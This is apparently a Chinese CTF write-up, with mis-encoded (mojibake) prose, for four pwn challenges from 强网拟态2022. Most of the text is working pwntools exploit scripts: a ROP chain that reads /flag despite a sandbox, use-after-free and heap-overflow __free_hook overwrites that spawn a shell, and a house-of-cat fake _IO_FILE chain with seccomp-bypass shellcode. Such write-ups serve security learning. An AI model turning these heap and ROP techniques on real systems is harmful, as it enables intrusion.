---

title: ã€ŒPWNã€ã€å¼ºç½‘æ‹Ÿæ€2022ã€‘Writeup WP å¤ç°

tags: ['CTF', 'Pwn', 'writeup', 'wp']

authors: [nova]

---



# ã€ŒPWNã€ã€å¼ºç½‘æ‹Ÿæ€2022ã€‘å¤ç° WP

[é™„ä»¶ä»“åº“](https://github.com/Nova-Noir/NovaNo1r-pwn-challenges/tree/main/å¼ºç½‘æ‹Ÿæ€2022/)

é™¤äº† `pwn` åˆ†ç±»å¤–ï¼Œè¿™æ¬¡æ¯”èµ›è¿˜æœ‰ä¸€ä¸ª `mimic` åˆ†ç±»ä¹Ÿæœ‰é¢˜ç›®ï¼Œä½†æ˜¯å› ä¸ºå¤ªç®€å•äº†æ‰€ä»¥å°±ä¸å†™ wp äº†çœ‹çœ‹ exp å°±å¥½ã€‚

<!--truncate-->

## bfbf

æ•´ä¸ªç¨‹åºé€šè¿‡è¯»å…¥ä¸€äº›ç¬¦å·å¹¶å¯¹æ¥ä¸‹æ¥è¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œä¸€ç³»åˆ—æ“ä½œã€‚

ä½†æ˜¯å­—ç¬¦ä¸²æ•°ç»„åªæœ‰ `520` ä¸ªå­—èŠ‚çš„é•¿åº¦ï¼Œè€Œæ“ä½œç¬¦å´å¯ä»¥è¾¾åˆ° `0xfff` ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥å­˜åœ¨æ ˆæº¢å‡ºã€‚

å€¼å¾—æ³¨æ„çš„æ˜¯ `[`å’Œ `]` å®ç°äº†ä¸€ä¸ªå¾ªç¯ç»“æ„ï¼Œè™½ç„¶å¥½åƒä¸ç”¨è¿™ä¸ªä¹Ÿå¤Ÿå†™ï¼ˆæ²¡æµ‹è¯•ï¼‰

> `word_4062` å³ä¸ºå›¾äºŒçš„ `bracket_arr`

![sym_read](https://novanoir-aliyun-oss.oss-cn-hongkong.aliyuncs.com/img/image-20221108112206978.png)

![str_read](https://novanoir-aliyun-oss.oss-cn-hongkong.aliyuncs.com/img/image-20221108112740265.png)



åŒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ ˆä¸Šæ‰¾åˆ°ä¸€äº›å¯ä»¥ç”¨çš„æ•°æ®æ¥æ³„éœ²ç¨‹åºåŸºå€å’Œ `libc`

![](https://novanoir-aliyun-oss.oss-cn-hongkong.aliyuncs.com/img/image-20221108113456187.png)

ä¹‹åå³å¯ `ROP` ã€‚ä½†æ˜¯ç¨‹åºæœ‰æ²™ç®±ï¼Œç¦æ­¢äº† `fd > 0` çš„ `read` æ“ä½œä»¥åŠ `execve` è·å– `shell`ã€‚æ­¤æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡å…³é—­ `fd=0` çš„ `stdin` å†è¿›è¡Œ `open("/flag")` æ¥è·å– `fd=0` çš„æ–‡ä»¶æè¿°ç¬¦ã€‚

é™¤æ­¤ä¹‹å¤–ï¼Œæ­£å¸¸ `orw` å³å¯

```python
from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

# sh = process(['./pwn'])
elf = ELF('./pwn')
libc = ELF('./libc.so.6')
sh = remote("172.51.65.235", 9999)

payload1 = b",[>,]"  # padding loop
payload1 += b">"*0x0F  # padding to proc
payload1 += b">."*0x6  # retrieve proc
payload1 += b">"*0x1A  # padding to libc
payload1 += b">."*0x6  # retrieve libc
payload1 += b"<"*0x25  # fallback to overwrite return addr
payload1 += b",>"*(29*0x08)  # orw!

sh.sendafter(b"BF_PARSER>>", payload1)
sh.send(b"A"*520)
# gdb.attach(sh, 'b getchar')
# pause()
sh.send(b'\x00')
sh.recvline()

proc_base = sh.recv(1)
proc_base += sh.recv(5)
proc_base = u64(proc_base.ljust(8, b'\x00')) - 0x1955
libc_base = u64(sh.recv(6).ljust(8, b'\x00')) - 0x24083

pop_rax_ret_addr = libc_base + 0x36174
pop_rdi_ret_addr = libc_base + 0x23b6a
pop_rsi_ret_addr = libc_base + 0x02601f
pop_rdx_ret_addr = libc_base + 0x142c92
bss_addr = proc_base + elf.bss() + 0x100

print("bss_addr >>>", hex(bss_addr))
print("libc_base >>>", hex(libc_base))
print("proc_base >>>", hex(proc_base))

payload = p64(pop_rdi_ret_addr) + p64(0) + p64(pop_rsi_ret_addr) + p64(bss_addr) + p64(pop_rdx_ret_addr) + p64(0x100) + p64(libc_base + libc.sym['read'])
payload += p64(pop_rdi_ret_addr) + p64(0) + p64(libc_base + libc.sym['close'])
payload += p64(pop_rdi_ret_addr) + p64(bss_addr) + p64(pop_rsi_ret_addr) + p64(0) + p64(libc_base + libc.sym['open']) 
payload += p64(pop_rdi_ret_addr) + p64(0) + p64(pop_rsi_ret_addr) + p64(bss_addr + 0x100) + p64(pop_rdx_ret_addr) + p64(0x100) + p64(libc_base + libc.sym['read'])
payload += p64(pop_rdi_ret_addr) + p64(1) + p64(pop_rsi_ret_addr) + p64(bss_addr + 0x100) + p64(pop_rdx_ret_addr) + p64(0x100) + p64(libc_base + libc.sym['write'])

# gdb.attach(sh, 'b *' + hex(pop_rdi_ret_addr))
# pause()
# print(hex(len(payload1)))

sh.send(payload)
sh.sendline(b"/flag\x00")
sh.interactive()

```



## webheap

```bash
patchelf --set-interpreter ~/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/ --set-interpreter ~/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/ld-2.27.so --replace-needed libm.so.6 ~/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libm.so.6 --replace-needed libc.so.6 ~/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6 --replace-needed libgcc_s.so.1 /mnt/f/Downloads/libgcc_s.so.1 --replace-needed libstdc++.so.6 /mnt/f/Downloads/libstdc++.so.6.0.25 webheap
```



ä¸»è¦éš¾ç‚¹åœ¨äºé€†åè®®ï¼Œå¥½åƒè¯´å’Œç¬¬äº”ç©ºé—´çš„ `safevm` æ˜¯ä¸€ä¸ªåè®®ã€‚

æ ¹æ®æŠ¥é”™å¯ä»¥æœå‡ºæ¥æ˜¯ `libnop`ï¼Œåœ¨ `github` ä¸Šèƒ½æ‰¾åˆ° [æºç ](https://github.com/google/libnop/)ã€‚é€šè¿‡ç¼–è¯‘ä¸€ä¸ªè¿‘ä¼¼ `elf` è¿›è¡Œ `bindiff` å¯¼å…¥ç¬¦å·è¡¨æ¥å‡å°‘åç¼–è¯‘éš¾åº¦ã€‚

æµ‹è¯•ä¹‹åå¯ä»¥å‘ç°ä¸»è¦çš„ `validation checker` å°±åœ¨`checker` å‡½æ•°é‡Œã€‚è¿™é‡Œç‚¹è¿›å»çœ‹å°±å¤§æ¦‚çŸ¥é“ç»“æ„äº†ï¼ˆå”¯ä¸€ä¸æ¸…æ¥šçš„æ˜¯ `deserialized_data` æ˜¯ä»€ä¹ˆæ—¶å€™å˜æ¢ idx çš„ï¼Œå¯èƒ½æ˜¯åœ¨ `std::string::size` è¿™ä¸ªå‡½æ•°é‡Œï¼Ÿï¼‰è¿™é‡Œå‘éƒ¨åˆ†æˆªå›¾ï¼Œå…·ä½“å¯ä»¥ä¸‹è½½ [webheap.i64](https://github.com/Nova-Noir/NovaNo1r-pwn-challenges/blob/main/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022/webheap/webheap.i64) çœ‹çœ‹

![main](https://cdn.novanoir.moe/img/image-20221109113745373.png)

![checker_](https://cdn.novanoir.moe/img/image-20221109113909310.png)

![get_int_data](https://cdn.novanoir.moe/img/image-20221109113601615.png)



æœ€åçš„åºåˆ—å€¼åº”è¯¥æ˜¯è¿™æ ·çš„ï¼š

`B9 [(uint)=5] [int] [int] [int] BD [(uint64)=nbytes] [string] [int]`

å…¶ä¸­ï¼Œé€šè¿‡è§‚å¯Ÿä»¥åŠå®˜æ–¹æ–‡æ¡£å¯ä»¥å‘ç°å®ƒçš„ `uint` å’Œ `int` å¯ä»¥æŒ‡å®šï¼ˆä¾‹å¦‚ uint32: `82 ef be ad de`ï¼‰ï¼Œä¹Ÿå¯ä»¥ä¸æŒ‡å®šé»˜è®¤ä½¿ç”¨ *positive fixint* æ¥ä»£è¡¨ `0~0x7f` çš„å€¼

è€Œå…·ä½“çš„æ“ä½œåˆ™æ˜¯åœ¨ä¸‹é¢ï¼Œé€šè¿‡è§‚å¯Ÿå¯ä»¥åˆ¤æ–­å„ä¸ªåºåˆ—åŒ–å€¼æŒ‡ä»£çš„å†…å®¹ï¼š

| serialized data   | meaning              |
| ----------------- | -------------------- |
| B9                | struct identifier    |
| [(uint)=5]        | struct member counts |
| [int0]            | choice               |
| [int1]            | idx                  |
| [int2]            | size                 |
| BD                | string identifier    |
| [(uint64)=nbytes] | string length        |
| [string]          | content              |
| [int3]            | NO_USE               |



æœ€å `vuln_func` å°±å¾ˆå®¹æ˜“çœ‹äº†ã€‚

![menu](https://cdn.novanoir.moe/img/image-20221108120345842.png)

![delete](https://cdn.novanoir.moe/img/image-20221108120404366.png)

æ¼æ´ç‚¹å¾ˆæ˜¾ç„¶ï¼Œåœ¨ `delete` ä¹‹åæ²¡æœ‰æ¸…é™¤æŒ‡é’ˆå­˜åœ¨ `UAF` çš„æ¼æ´ã€‚ç›´æ¥æ‰“ `free_hook` å°±å¥½ã€‚

```python
from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

sh = process(['./webheap'])
elf = ELF('./webheap')
libc = ELF('/home/nova/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so')
# sh = remote('172.51.65.90',9999)

"""
struct Person {
  std::uint64_t cmd;
  std::uint64_t idx;
  std::uint64_t sz;
  std::string name;
  std::uint64_t nothing;
  NOP_STRUCTURE(Person, cmd, idx, sz, name, nothing);
};
"""

def pack_int(num: int):
    return b'\x82' + p32(num)


def pack_str(content: bytes):
    return b'\xBD' + len(content).to_bytes(1,'little') + content


def payload(cmd: int, idx: int, size: int = 0x20, content: bytes = b'A'*0x20) -> bytes:
    payload = b'\xB9\x05'
    payload += cmd.to_bytes(1, 'little')
    payload += b'\x82' + p32(idx) + b'\x82' + p32(size)
    payload += pack_str(content)
    payload += b'\x00'
    return payload


def send_packet(content: bytes):
    sh.sendlineafter(b'Packet length: ', str(len(content)).encode())
    sh.sendafter(b'Content: ', content)


def add(idx: int, size: int):
    send_packet(payload(0, idx, size))


def show(idx: int):
    send_packet(payload(1, idx))


def delete(idx: int):
    send_packet(payload(2, idx))


def edit(idx: int, content: bytes):
    send_packet(payload(3, idx, 0, content))



add(0, 0x580)  # 0
add(1, 0x10)  # 1
# gdb.attach(sh)
# pause()
delete(0)
show(0)


libc_base = u64(sh.recv(6).ljust(8,b'\x00')) - 0x3ebca0
print("libc_base >>> ", hex(libc_base))

free_hook_addr = libc_base + libc.sym['__free_hook']
system_addr = libc_base + libc.sym['system']

add(2, 0x80)  # 2
add(3, 0x80)  # 3

delete(2)
delete(3)

edit(3, p64(free_hook_addr))


add(4, 0x80)  # 4
add(5, 0x80)  # 5 <--> 3
add(6, 0x80)  # 6
edit(6, b'/bin/sh\x00')
edit(5, p64(system_addr))
delete(6)


sh.interactive()

```



## webheap_revenge

```bash
patchelf --set-interpreter ~/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/ --set-interpreter ~/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/ld-2.27.so --replace-needed libm.so.6 ~/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libm.so.6 --replace-needed libc.so.6 ~/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6 --replace-needed libgcc_s.so.1 /mnt/f/Downloads/libgcc_s.so.1 --replace-needed libstdc++.so.6 /mnt/f/Downloads/libstdc++.so.6.0.25 webheap_revenge
```

è¿™é¢˜æ²¡æƒ³åˆ° IDA æ‰“å¼€ä¹‹åå¾ˆæ¸…æ™°ï¼Œæ¯” `webheap` æ¸…æ™°å¾ˆå¤šï¼Œä¸€çœ¼å°±èƒ½çœ‹å‡ºæ¥ç»“æ„ã€‚

![image-20221108152026453](https://cdn.novanoir.moe/img/image-20221108152026453.png)

å¯¹æ¯”å¯ä»¥å‘ç°ï¼Œ`delete` çš„ UAF å·²ç»æ²¡äº†ã€‚

ä½†æ˜¯åœ¨ `edit` é‡Œï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°å®ƒè¿›è¡Œäº†ä¸€ä¸ª `memcpy` çš„æ“ä½œï¼Œä½†æ˜¯ `chunk_size` åœ¨è°ƒè¯•åå‘ç°å®ƒå®é™…ä¸Šæ˜¯æˆ‘ä»¬åºåˆ—åŒ–ä¸­ `str` çš„å¤§å°ï¼ˆå‡†ç¡®æ¥è¯´ï¼Œå®ƒæ˜¯åƒ`malloc`ä¸€æ · 8 å­—èŠ‚å‘ä¸Šå¯¹é½çš„ï¼‰è€Œå¹¶éæˆ‘ä»¬åœ¨ `add` æ“ä½œä¸­è®°å½•çš„å †çš„å¤§å°ï¼Œè¿™å°±é€ æˆå¯ä»¥å †æº¢å‡ºï¼Œç›´æ¥æ”¹æŒ‡é’ˆå°±å¥½ã€‚ï¼ˆéš¾ç‚¹å¤§æ¦‚å°±æ˜¯è¿™ä¸ª `v128` äº†ï¼Œä¸çŸ¥é“å®ƒä»€ä¹ˆæ—¶å€™è¢«èµ‹å€¼äº†ï¼Œé  `gdb` è°ƒå‡ºæ¥çš„ï¼‰

ç”±äº `add` çš„æ—¶å€™åªè¿›è¡Œäº† `malloc` è€Œæ²¡æœ‰è®¾ç½®å †å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¾ç„¶å¯ä»¥é€šè¿‡ ub æ³„éœ² `libc`ã€‚ä¹‹åç»§ç»­æ‰“ `free_hook` å³å¯

```python
from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

sh = process(['./webheap_revenge'])
elf = ELF('./webheap_revenge')
libc = ELF('/home/nova/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so')
# sh = remote('172.51.65.90',9999)

"""
struct Person {
  std::uint64_t cmd;
  std::uint64_t idx;
  std::uint64_t sz;
  std::string name;
  std::uint64_t nothing;
  NOP_STRUCTURE(Person, cmd, idx, sz, name, nothing);
};
"""

def pack_int(num: int):
    return b'\x82' + p32(num)


def pack_str(content: bytes):
    return b'\xBD' + len(content).to_bytes(1,'little') + content


def payload(cmd: int, idx: int, size: int = 0x20, content: bytes = b'A'*0x20) -> bytes:
    payload = b'\xB9\x05'
    payload += cmd.to_bytes(1, 'little')
    payload += b'\x82' + p32(idx) + b'\x82' + p32(size)
    payload += pack_str(content)
    payload += b'\x00'
    return payload


def send_packet(content: bytes):
    sh.sendlineafter(b'Packet length: ', str(len(content)).encode())
    sh.sendafter(b'Content: ', content)


def add(idx: int, size: int):
    send_packet(payload(0, idx, size))


def show(idx: int):
    send_packet(payload(1, idx))


def delete(idx: int):
    send_packet(payload(2, idx))


def edit(idx: int, content: bytes):
    send_packet(payload(3, idx, 0, content))
    

add(0, 0x580)  # 0
add(1, 0x10)  # 1
delete(0)
add(2, 0x10)  # 2
show(2)

libc_base = u64(sh.recv(6).ljust(8,b'\x00')) - 0x3ec0f0
print("libc_base >>> ", hex(libc_base))

free_hook_addr = libc_base + libc.sym['__free_hook']
system_addr = libc_base + libc.sym['system']

add(3, 0x20)  # 3
add(4, 0x20)  # 4
add(5, 0x20)  # 5
delete(4)
edit(3, p64(0)*5+p64(0x31)+p64(free_hook_addr))
add(6, 0x20)  # 6
add(7, 0x20)  # 7 <- free_hook
# gdb.attach(sh, 'b *$rebase(0x2982)\n' + 'x/20gx $rebase(0x205400)')
# pause()
edit(6, b'/bin/sh\x00')
edit(7, p64(system_addr))
delete(6)

sh.interactive()

```



## store

è¿™é¢˜è°ƒäº†æˆ‘ä¸ƒå…«ä¸ªå°æ—¶ ^ ^"ã€‚ç¨‹åºæœ¬èº«ååˆ†ç®€å•ï¼Œç‰ˆæœ¬æ˜¯ glibc-2.31 ã€‚

![image-20221109105331793](https://cdn.novanoir.moe/img/image-20221109105331793.png)

`add` åªèƒ½åŠ ä¸¤ä¸ªï¼Œä½†æ˜¯å¯ä»¥æ— é™`malloc`

![add](https://cdn.novanoir.moe/img/image-20221109105440865.png)

`delete` æ²¡æœ‰æ¸…é™¤æŒ‡é’ˆå¯ä»¥é€ æˆ UAFï¼Œå¹¶ä¸”åª free äº† chunk_array è€Œæ²¡æœ‰ free remark_arrayã€‚ä¸è¿‡åªæœ‰ `4` æ¬¡çš„åˆ é™¤é™åˆ¶ã€‚

![delete](https://cdn.novanoir.moe/img/image-20221109105455826.png)



èœå•ï¼š

```python
from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

sh = process(['./store'])
elf = ELF('./store')
libc = ELF('/home/nova/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so')


def menu(choice: int):
    sh.sendlineafter(b"choice: ", str(choice).encode())


def add(size: int, content: bytes, remark: bytes):
    menu(1)
    sh.sendlineafter(b"Size: ", str(size).encode())
    sh.sendafter(b"Content: ", content)
    sh.sendafter(b"Remark: ", remark)


def delete(idx: int):
    menu(2)
    sh.sendlineafter(b"Index: ", str(idx).encode())


def edit(idx: int, content: bytes, remark: bytes):
    menu(3)
    sh.sendlineafter(b"Index: ", str(idx).encode())
    sh.sendafter(b"Content: ", content)
    sh.sendafter(b"Remark: ", remark)


def show(idx: int):
    menu(4)
    sh.sendlineafter(b"Index: ", str(idx).encode())

```



åˆæ­¥èƒ½æƒ³åˆ°çš„å°±æ˜¯å…ˆ `ub` æ³„éœ² `libc` åœ°å€ï¼Œç„¶åé€šè¿‡ `largebin` è¦†ç›– `bk` å’Œ `fd` æ¥æ³„éœ²å †åœ°å€ã€‚

```python
add(0x460, b'\x00', b'\x00')  # 0
add(0x440, b'\x00', b'\x00')  # 1
delete(0)
show(0)

sh.recvuntil(b"Content: \n")
libc_base = u64(sh.recv(6).ljust(8, b'\x00')) - 0x1ebbe0
print("libc_base >>>", hex(libc_base))

menu(1)
sh.sendlineafter(b"Size: ", str(0x480).encode())
edit(0, b'A'*0x10, b'\x00')
show(0)

sh.recvuntil(b'A'*0x10)
heap_base = u64(sh.recv(6).ljust(8, b'\x00')) - 0x290
print("heap_base >>>", hex(heap_base))
```

è‡³æ­¤ï¼Œæˆ‘ä»¬æœ‰äº† 4 ä¸ªå¯æ§çš„å †åœ°å€è¿˜æœ‰ `libc_base` å’Œ `heap_base`

å› ä¸º libc ç‰ˆæœ¬è¾ƒé«˜ï¼Œæ‰€ä»¥è€ƒè™‘ä¼ªé€  `_IO_File` çš„æ–¹å¼åŠ«æŒç¨‹åºæµã€‚`MARK` ç”¨çš„æ˜¯ `house of emma + house of apple` æ„é€ ä¸¤ä¸ª `fake_io_file` ï¼Œä¸€ä¸ªä¿®æ”¹ `pointer_guard` ä¸€ä¸ªç”¨æ¥åš `house_of_emma`ï¼Œæˆ‘åœ¨æœçš„æ—¶å€™çœ‹åˆ° `house of cat` å¯ä»¥ä¸ç”¨ä¿®æ”¹ `pointer_guard` åªä½¿ç”¨ä¸€ä¸ª `fake_io_file`ï¼Œæ‰€ä»¥å°±è¯•äº†è¯•ã€‚

è¿˜æ˜¯é€‰æ‹©é€šè¿‡ `FSOP` çš„æ–¹æ³•æ¥è°ƒç”¨é“¾å­ã€‚å…ˆé€šè¿‡ `largebin attack` æŠŠ `_IO_list_all` çš„é“¾è¡¨å¤´ä¿®æ”¹æˆæˆ‘ä»¬çš„ `chunk1` åœ°å€

```python
largebin_fd = libc_base + 0x1ebfe0
io_list = libc_base + libc.sym['_IO_list_all']

edit(0, p64(largebin_fd)*2 + p64(heap_base + 0x290) + p64(io_list-0x20), b'\x00')
delete(1)

menu(1)
sh.sendlineafter(b"Size: ", str(0x480).encode())
```

ç„¶åç›´æ¥ç”¨é“¾å­æ„é€  `fake_io`ï¼Œè¿™ä¸ªæ¨¡æ¿ç›´æ¥åœ¨æ”»å‡»æ‰‹æ³•ä»‹ç»é‡Œå°±èƒ½æ‰¾åˆ°ã€‚

```python
# åŸé“¾
fake_io_addr=heapbase+0xb00 # ä¼ªé€ çš„fake_IOç»“æ„ä½“çš„åœ°å€
next_chain = 0
fake_IO_FILE=p64(rdi)         #_flags=rdi
fake_IO_FILE+=p64(0)*7
fake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP)
fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx
fake_IO_FILE +=p64(call_addr)#_IO_save_end=call addr(call setcontext/system)
fake_IO_FILE = fake_IO_FILE.ljust(0x68, '\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x88, '\x00')
fake_IO_FILE += p64(heapbase+0x1000)  # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0xa0, '\x00')
fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xc0, '\x00')
fake_IO_FILE += p64(1) #mode=1
fake_IO_FILE = fake_IO_FILE.ljust(0xd8, '\x00')
fake_IO_FILE += p64(libcbase+0x2160c0+0x10)  # vtable=IO_wfile_jumps+0x10
fake_IO_FILE +=p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr
```

åœ¨è¿™é‡Œæˆ‘è°ƒäº†å¥½ä¹…ï¼Œä½†è€æ˜¯è¿›ä¸å» `setcontext`ï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ä¸æ˜¯é“¾å­ä¸å¥½ä½¿äº†ï¼Œç»“æœæœ€å `gdb` ä¸€è°ƒæ‰å‘ç°æˆ‘çš„ `fake_io` æ˜¯ `chunk1 - 0x10`ï¼Œæ‰€ä»¥ `_flags` å’Œ `_IO_read_ptr` å·²ç»æ˜¯å›ºå®šçš„äº†ï¼Œéœ€è¦è°ƒä¸€è°ƒé“¾å­ã€‚

```python
io_wfile_jumps = libc_base+libc.sym['_IO_wfile_jumps']
setcontext = libc_base + libc.sym['setcontext']

fake_io_addr = heap_base + 0xb70                    # ä¼ªé€ çš„fake_IOç»“æ„ä½“çš„åœ°å€
fake_IO_FILE = p64(0)                               
fake_IO_FILE += p64(0) * 5
fake_IO_FILE += p64(1) + p64(2)                     # rcx!=0(FSOP)
fake_IO_FILE += p64(heap_base + 0xfc0 - 0x50)              # _IO_backup_base=rdx
fake_IO_FILE += p64(setcontext+61)                  # _IO_save_end=call addr(call setcontext/system)
fake_IO_FILE = fake_IO_FILE.ljust(0x58, b'\x00')
fake_IO_FILE += p64(0)                              # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x78, b'\x00')
fake_IO_FILE += p64(heap_base+0x1000)               # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0x90, b'\x00')
fake_IO_FILE += p64(fake_io_addr+0x30)               # _wide_data,rax1_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b'\x00')
fake_IO_FILE += p64(1)                              # mode=1
fake_IO_FILE = fake_IO_FILE.ljust(0xc8, b'\x00')
fake_IO_FILE += p64(io_wfile_jumps+0x30)            # vtable=IO_wfile_jumps+0x10
fake_IO_FILE += p64(0) * 6
fake_IO_FILE += p64(fake_io_addr+0x40)              # rax2_addr
```

![fake_IO_FILE](https://cdn.novanoir.moe/img/image-20221109112027047.png)

ä¹‹åï¼Œç¨‹åºæµæ—¢ç„¶å¯ä»¥æ“æ§ä¹Ÿå¯ä»¥ `ROP` äº†ï¼Œå°±æƒ³ç€å†™ `shellcode` äº†ã€‚è¿™é‡Œçš„æ²™ç®±æœ‰ç‚¹ğŸ‚ï¼Œç¬¬ä¸€æ¬¡è§ï¼Œæ˜¯ä» `SEKAI CTF 2022 - HELLO WORLD SETUP` é‡Œå·è¿‡æ¥çš„ï¼Œ`i386` å’Œ `amd64` çš„æ²™ç®±ä¸ä¸€æ ·ï¼Œä½†æ˜¯åœ¨ 64 ä½ä¸‹å¯ä»¥é€šè¿‡è°ƒç”¨æ²™ç®±ä¸­å¯ç”¨çš„ 32 ä½ç³»ç»Ÿè°ƒç”¨å·è°ƒç”¨ 64 ä½å¯¹åº”çš„ç¨‹åºè°ƒç”¨å·ï¼ˆæœ‰ç‚¹æ‹—å£ï¼Ÿï¼‰

> ä¸¾ä¸ªä¾‹å­ï¼Œ32 ä½ä¸‹ `SYS_fstat` çš„ç³»ç»Ÿè°ƒç”¨å·æ˜¯ `5`ï¼Œæ­£å¯¹åº”äº† 64 ä½ä¸‹çš„ `SYS_open`
>
> æ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ 32 ä½è°ƒç”¨ç³»ç»Ÿè°ƒç”¨å·æ—¶çš„è®¾ç½®ã€‚
>
> >  åœ¨ 32 ä½ä¸‹ï¼Œä¼ å‚æŒ‰ç…§ `ebx, ecx, edx, esi, edi, ebp` çš„é¡ºåº
> >
> > åœ¨ 64 ä½ä¸‹ï¼Œå°±æŒ‰ 64 ä½ çš„ `rsi, rdi, rdx, rcx, r8, r9` çš„é¡ºåº
>
> ```assembly
>     mov rax, 5
>     mov rbx, addr
>     xor rcx, rcx
>     xor rdx, rdx
>     int 0x80        # open(addr, 0, 0)
> ```
>
> 

å…·ä½“çš„å°±ç›´æ¥æŠ„ [HELLO WORLD SETUP WP](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/pwn/hello-world-setup/solution) çš„æ²™ç®±å°±å¥½

æœ€åçš„ exp:

```python
from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

sh = process(['./store'])
elf = ELF('./store')
libc = ELF('/home/nova/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so')


def menu(choice: int):
    sh.sendlineafter(b"choice: ", str(choice).encode())


def add(size: int, content: bytes, remark: bytes):
    menu(1)
    sh.sendlineafter(b"Size: ", str(size).encode())
    sh.sendafter(b"Content: ", content)
    sh.sendafter(b"Remark: ", remark)


def delete(idx: int):
    menu(2)
    sh.sendlineafter(b"Index: ", str(idx).encode())


def edit(idx: int, content: bytes, remark: bytes):
    menu(3)
    sh.sendlineafter(b"Index: ", str(idx).encode())
    sh.sendafter(b"Content: ", content)
    sh.sendafter(b"Remark: ", remark)


def show(idx: int):
    menu(4)
    sh.sendlineafter(b"Index: ", str(idx).encode())


add(0x460, b'\x00', b'\x00')  # 0
add(0x440, b'\x00', b'\x00')  # 1
delete(0)
show(0)

sh.recvuntil(b"Content: \n")
libc_base = u64(sh.recv(6).ljust(8, b'\x00')) - 0x1ebbe0
largebin_fd = libc_base + 0x1ebfe0
io_list = libc_base + libc.sym['_IO_list_all']
io_wfile_jumps = libc_base+libc.sym['_IO_wfile_jumps']
setcontext = libc_base + libc.sym['setcontext']
mprotect = libc_base + libc.sym['mprotect']
print("libc_base >>>", hex(libc_base))

menu(1)
sh.sendlineafter(b"Size: ", str(0x480).encode())
edit(0, b'A'*0x10, b'\x00')
show(0)

sh.recvuntil(b'A'*0x10)
heap_base = u64(sh.recv(6).ljust(8, b'\x00')) - 0x290
print("heap_base >>>", hex(heap_base))
edit(0, p64(largebin_fd)*2 + p64(heap_base + 0x290) + p64(io_list-0x20), b'\x00')
delete(1)

menu(1)
sh.sendlineafter(b"Size: ", str(0x480).encode())

# House of cat
fake_io_addr = heap_base + 0xb70                    # ä¼ªé€ çš„fake_IOç»“æ„ä½“çš„åœ°å€
fake_IO_FILE = p64(0)                               
fake_IO_FILE += p64(0) * 5
fake_IO_FILE += p64(1) + p64(2)                     # rcx!=0(FSOP)
fake_IO_FILE += p64(heap_base + 0xfc0 - 0x50)              # _IO_backup_base=rdx
fake_IO_FILE += p64(setcontext+61)                  # _IO_save_end=call addr(call setcontext/system)
fake_IO_FILE = fake_IO_FILE.ljust(0x58, b'\x00')
fake_IO_FILE += p64(0)                              # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x78, b'\x00')
fake_IO_FILE += p64(heap_base+0x1000)               # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0x90, b'\x00')
fake_IO_FILE += p64(fake_io_addr+0x30)               # _wide_data,rax1_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b'\x00')
fake_IO_FILE += p64(1)                              # mode=1
fake_IO_FILE = fake_IO_FILE.ljust(0xc8, b'\x00')
fake_IO_FILE += p64(io_wfile_jumps+0x30)            # vtable=IO_wfile_jumps+0x10
fake_IO_FILE += p64(0) * 6
fake_IO_FILE += p64(fake_io_addr+0x40)              # rax2_addr

shellcode = asm(
    '''
    mov rax, 0xc0
    mov rbx, 0x500000
    mov rcx, 0x5000
    mov rdx, 3
    mov rsi, 0x100021
    xor rdi, rdi
    xor rbp, rbp
    int 0x80        # mmap2(0x500000, 0x5000, 3, 0x100021, 0, 0)
    
    mov rdi, 0
    mov rsi, 0x502000
    mov rdx, 0x100
    xor rax, rax
    syscall
     
    mov rax, 5
    mov rbx, 0x502000
    xor rcx, rcx
    xor rdx, rdx
    int 0x80        # open(0x502000, 0, 0)
     
    mov rdi, rax
    mov rsi, 0x503000
    mov rdx, 0x100
    xor rax, rax
    syscall
     
    mov rdi, 1
    mov rax, 1
    syscall
    ''', arch='amd64')

#                           rdi                rsi                   rdx                          rsp           rcx(retn_addr)
payload = p64(0) + p64(heap_base+0x1000) + p64(0x2000) + p64(0)*2 + p64(7) + p64(0)*2 + p64(heap_base+0x1020) + p64(mprotect) + p64(heap_base+0x1028) + shellcode
edit(1, fake_IO_FILE, payload)
gdb.attach(sh, 'b *mprotect')
